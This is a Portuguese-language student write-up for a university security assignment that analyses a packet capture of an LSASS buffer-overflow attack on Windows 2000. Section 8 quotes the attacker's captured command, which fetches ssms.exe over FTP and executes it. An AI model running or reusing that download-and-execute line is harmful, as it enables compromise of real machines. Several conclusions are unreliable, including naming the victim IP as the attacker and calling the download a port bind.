# traffic-analysis

My traffic analysis for the computational Security class at UFPR

vamos utilizar o tcpdump para ler o arquivo `.pcap` com o tráfego de rede e responder as perguntas:

1. Quais endereços IP/hosts estão envolvidos? (1pt)
2. O que você consegue descobrir sobre a máquina atacante (ex.: onde ela está localizada)? (1pt)
3. Quantas *sessões* TCP o arquivo possui? (1pt)
4. Quanto tempo o ataque levou? (1pt)
5. Qual sistema operacional foi alvo do ataque? Qual o serviço atacado? Qual a vulnerabilidade explorada? (3pts)
6. Esboce graficamente uma visão geral das ações realizadas pelo atacante (considere a topologia de rede, os passos do ataque, os resultados). (3pts)
7. Que vulnerabilidade específica foi explorada (CVE, propriedades de segurança violadas, como ela ocorre, etc.)? (1pt)
8. O que a shellcode faz? Liste a shellcode (código). (4pts)
9. Você acha que um honeypot foi utilizado para se passar por vítima vulnerável? Justifique. (3pts)
10. Houve código malicioso envolvido? Se sim, qual o nome/rótulo do malware? (1pt)
11. Você acha que o ataque foi manual ou lançado de maneira automática? Justifique sua resposta. (1pt)

***

## 1. Quais endereços IP/hosts estão envolvidos? (1pt)

Para descobrir quais endereços IP/hosts estão envolvidos, podemos utilizar o comando

```bash
tcpdump -r attack-trace.pcap -n | awk '{print $3}' | sort | cut -d. -f1,2,3 | uniq
```

 para filtrar os endereços IP e hosts envolvidos no ataque. O resultado desse comando é:

`192.150.11.111 - Adobe Systems Inc`

`98.114.205.102 - pool-98-114-205-102.phlapa.fios`

***

## 2. O que você consegue descobrir sobre a máquina atacante (ex.: onde ela está localizada)? (1pt)

Para descobrir onde a máquina atacante está localizada, podemos utilizar o comando

```bash
whois 192.150.11.111 | grep -E 'OrgName|City|Country'
```

 para descobrir a localização da máquina atacante. O resultado desse comando é:

`OrgName:        Adobe Systems Inc.`

`City:           San Jose`

`Country:        US`

***

## 3. Quantas *sessões* TCP o arquivo possui? (1pt)

Para descobrir quantas sessões TCP o arquivo possui, podemos utilizar o comando

```bash
tcpdump -r attack-trace.pcap tcp[tcpflags]=='tcp-syn' -nn | wc -l
```

 para filtrar as sessões TCP e contar quantas sessões existem. Podemos ver que existem 5 sessões e o registro de cada uma delas é mostrado abaixo.

```bash
00:28:28.374595 IP 98.114.205.102.1821 > 192.150.11.111.445: Flags [S], seq 147554406, win 64240, options [mss 1460,nop,nop,sackOK], length 0
00:28:28.509145 IP 98.114.205.102.1828 > 192.150.11.111.445: Flags [S], seq 147846946, win 64240, options [mss 1460,nop,nop,sackOK], length 0
00:28:30.466428 IP 98.114.205.102.1924 > 192.150.11.111.1957: Flags [S], seq 152210861, win 64240, options [mss 1460,nop,nop,sackOK], length 0
00:28:33.457215 IP 192.150.11.111.36296 > 98.114.205.102.8884: Flags [S], seq 1545682588, win 5840, options [mss 1460,sackOK,TS val 4055633882 ecr 0,nop,wscale 7], length 0
00:28:34.516921 IP 98.114.205.102.2152 > 192.150.11.111.1080: Flags [S], seq 161784447, win 64240, options [mss 1460,nop,nop,sackOK], length 0
```

***

## 4. Quanto tempo o ataque levou? (1pt)

É simples descobrir quanto tempo o ataque levou, basta conferir o timestamp do primeiro e do último pacote do arquivo. Para isso, podemos utilizar o comando

```bash
tcpdump -r attack-trace.pcap -nn | head -n 1 | awk '{print $1}' && tcpdump -r attack-trace.pcap -nn | tail -n 1 | awk '{print $1}'
```

 que nos retorna o timestamp do primeiro e do último pacote do arquivo. O resultado desse comando é:

`00:28:28.374595`

`00:28:44.593813`

Portanto, o ataque levou cerca de `16 segundos`.

***

## 5. Qual sistema operacional foi alvo do ataque? Qual o serviço atacado? Qual a vulnerabilidade explorada? (3pts)

Para descobrir qual sistema operacional foi alvo do ataque, precisamos analisar as assinaturas nos pacotes, vamos analisar o arquivo `.pcap` utilizando o wireshark.

Em um dos pacotes, é possível encontrar o seguinte texto:

`Native LAN Manager: Windows 2000 5.0`

Indicando que o SO alvo do ataque é o Windows 2000 na versão 5.0.

O serviço atacado foi o `Active Directory`.

Podemos ver que o serviço atacado é o AD ( Active Directory ) pois, se analisarmos o frame de N° 33, que contém comandos de setup do AD:

`Active Directory Setup, DsRoleUpgradeDownlevelServer`

A vulnerabilidade explorada foi um buffer overflow no serviço de AD. Podemos perceber isso pois, se filtrarmos os pacotes por `length` no wireshark e olharmos apenas para o primeiro tcp stream (`tcp.stream eq 1`) veremos que os os maiores pacotes contém diversos `NOPS` e, prováveis paddings, `\x31`

***

## 6. Esboce graficamente uma visão geral das ações realizadas pelo atacante (considere a topologia de rede, os passos do ataque, os resultados). (3pts)

![attack](attack.png)

***

## 7. Que vulnerabilidade específica foi explorada (CVE, propriedades de segurança violadas, como ela ocorre, etc.)? (1pt)

Ao procurar por `windows 2000 Active Directory buffer overflow` no google, encontramos facilmente o `CVE-2003-0533` que é justamente uma vulnerabilidade de buffer overflow no serviço de AD do Windows 2000.
A principal propriedade de segurança violada foi a integridade, pois o atacante conseguiu executar um código arbitrário no sistema alvo.
A exploração ocorre mais especificamente no `lsass.exe`. Ele é responsável por fornecer pesquisas, autenticação e replicação de banco de dados do Active Directory.

Essa vulnerabilidade foi utilizada pelo worm `Sasser` na época.

***

## 8. O que a shellcode faz? Liste a shellcode (código). (4pts)

Ao analisar os frames do arquivo `.pcap` é possível encontrar, no frame `44` uma string contendo 'ms.exe'. Se seguirmos o stream tcp desse frame, podemos encontrar a shellcode que foi utilizada no ataque.

```bash
echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
ssms.exe
```

Ao que parece, essa shellcode faz o bind da porta `8884` em todas as interfaces de rede, faz o download do arquivo `ssms.exe` e o executa.

***

## 9. Você acha que um honeypot foi utilizado para se passar por vítima vulnerável? Justifique. (3pts)

Acredito que sim! Se seguirmos os tcp stream 3, conseguimos ver, ao fim, dos comandos `FTP` uma mensagem:

```text
220 NzmxFtpd 0wns j0
USER 1
331 Password required
PASS 1
230 User logged in.
SYST
215 NzmxFtpd
TYPE I
200 Type set to I.
PORT 192,150,11,111,4,56
200 PORT command successful.
RETR ssms.exe
150 Opening BINARY mode data connection
QUIT
226 Transfer complete.
221 Goodbye happy r00ting.
```

Devido à essa mensagem final `Goodbye happy r00ting` acredito que sim, um honeypot foi utilizado para se passar por vítima vulnerável.

***

## 10. Houve código malicioso envolvido? Se sim, qual o nome/rótulo do malware? (1pt)

Sim, o código malicioso envolvido foi aquele utilizado no Shellcode, um bind shell para executar comandos via `FTP` e fazer o download de um arquivo.
O nome do arquivo é `ssms.exe`. se procurarmos pelr rótulo `DsRoleUpgradeDownlevelServer`, encontrado anteriormente, o rótulo encontrado é: `Win32.Korgo Worm`

***

## 11. Você acha que o ataque foi manual ou lançado de maneira automática? Justifique sua resposta. (1pt)

Acredito que o ataque foi lançado de maneira automática, visto que o worm `Sasser` utilizava essa vulnerabilidade para se espalhar pela rede.

***

## Autores

- Vinícius Fontoura de Abreu (GRR20206873)
- Guiusepe Oneda Dal Pai (GRR20210572)
